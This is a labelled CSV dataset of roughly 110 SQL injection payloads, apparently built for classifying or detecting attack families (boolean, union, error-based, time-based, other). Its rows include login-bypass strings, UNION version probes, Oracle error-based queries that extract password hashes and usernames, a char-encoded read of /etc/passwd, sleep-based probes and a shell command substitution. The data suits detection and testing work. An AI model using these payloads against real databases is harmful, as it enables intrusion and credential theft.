source_line,family,payload
2,time,""" or pg_sleep  (  __TIME__  )  --"
3,other,"create user name identified by pass123 temporary tablespace temp default tablespace users,"
4,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"
5,union," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'"
6,union," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1"
7,other, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --
8,boolean,select * from users where id  =  1 +$+ or 1  =  1 -- 1
9,other,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;"
10,union," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'"
11,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'"
12,boolean,? or 1  =  1 --
13,boolean, )   or   (  'a'  =  'a
14,boolean,admin' or 1  =  1#
15,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1"
16,boolean,or 1  =  1 --
17,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"
18,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'"
19,boolean," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1"
20,boolean," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1"
21,other,distinct
22,boolean,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1'
23,boolean,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116"
24,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
25,boolean,"admin"" or ""1""  =  ""1""--"
26,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1"
27,other,insert
28,boolean," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1"
29,boolean," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1"
30,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i"
31,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1"
32,boolean,"or 1  =  1 or """"  =  "
33,boolean,/**/or/**/1/**/  =  /**/1
34,boolean," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1"
35,union," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'"
36,union," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'"
37,boolean,or 1  =  1/*
38,boolean,%27 or 1  =  1
39,union," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1"
40,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'"
41,other,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ..."
42,union," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'"
43,boolean,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1
44,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'"
45,union," select * from users where id  =  1 union select 1||1,version  (    )   -- 1"
46,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1"
47,boolean,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1'
48,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1"
49,boolean," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1"
50,boolean," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1"
51,boolean,or 1 --'
52,boolean," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1"
53,boolean,"admin"" or 1  =  1#"
54,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1"
55,other,\x27UNION SELECT
56,other,PRINT
57,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'"
58,boolean,or 1  =  1--
59,time,1 or pg_sleep  (  __TIME__  )  --
60,boolean," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1"
61,boolean,admin'  )   or   (  '1'  =  '1'/*
62,boolean,or 2 between 1 and 3
63,boolean," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1"
64,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1"
65,boolean,admin' or '1'  =  '1
66,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --"
67,union," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1"
68,boolean,""" or 0  =  0 --"
69,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1"
70,boolean,select * from users where id  =  1 <@.$ or 1  =  1 -- 1
71,boolean," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1"
72,union," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1"
73,boolean," select * from users where id  =  1 or "",."" or 1  =  1 -- 1"
74,other,char%4039%41%2b%40SELECT
75,boolean," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1"
76,boolean,admin'  )   or   (  '1'  =  '1
77,other,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...
78,boolean,"or 0  =  0 #"""
79,boolean," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1"
80,boolean,  )   or   (  'x'  =  'x
81,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1"
82,time,$  (  sleep 50  ) 
83,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1"
84,union,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --"
85,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1"
86,union," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1"
87,boolean," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1"
88,boolean,"""a"""" or 1  =  1--"""
89,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1"
90,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"
91,union," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'"
92,boolean,1 and user_name  (    )     =   'dbo'
93,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --"
94,union," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1"
95,union," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1"
96,boolean,select * from users where id  =  '1' *$ . or 1  =  1 -- 1'
97,boolean,select * from users where id  =  1 +$+. or 1  =  1 -- 1
98,boolean,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1
99,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i"
100,boolean,or 1  =  1 or ''  =  '
101,boolean,select * from users where id  =  1   or 1  =  1 -- 1
102,boolean,or 'text' > 't'
103,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"
104,boolean," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1"
105,union," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1"
106,boolean,admin' or '1'  =  '1'#
107,boolean,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1
108,other,s
109,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"
110,other, select * from information_schema.tables--
111,boolean," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1"
112,time,1   )    )    or pg_sleep  (  __TIME__  )  --
